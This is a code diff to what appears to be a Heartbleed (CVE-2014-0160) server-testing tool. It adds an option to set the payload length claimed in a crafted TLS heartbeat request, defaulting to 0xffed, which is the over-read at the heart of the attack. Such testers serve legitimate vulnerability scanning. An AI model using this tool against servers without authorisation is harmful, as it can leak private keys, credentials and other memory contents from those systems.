@@ -11,7 +11,7 @@ from argparse import ArgumentParser
 
 # Hexdump etc
 from pacemaker import hexdump, make_heartbeat, read_record, read_hb_response
-from pacemaker import Failure
+from pacemaker import Failure, payload_len
 
 parser = ArgumentParser(description='Test servers for Heartbleed (CVE-2014-0160)')
 parser.add_argument('host', help='Hostname to connect to')
@@ -27,6 +27,10 @@ parser.add_argument('-t', '--timeout', type=int, default=3,
         help='Timeout in seconds to wait for a Heartbeat (default %(default)d)')
 parser.add_argument('-x', '--count', type=int, default=1,
         help='Number of Heartbeats requests to be sent (default %(default)d)')
+parser.add_argument('-n', '--payload-length', type=payload_len, default=0xffed,
+        dest='payload_len',
+        help='Requested payload length including 19 bytes heartbeat type, ' +
+            'payload length and padding (default %(default)#x bytes)')
 
 default_ports = {
     'tls': 443,
@@ -107,7 +111,7 @@ def handle_ssl(sock, args, sslver='03 01'):
 
     # Are you alive? Heartbeat please!
     try:
-        sock.sendall(make_heartbeat(sslver))
+        sock.sendall(make_heartbeat(sslver, args.payload_len))
     except socker.error as e:
         print('Unable to send heartbeat! ' + str(e))
         return False
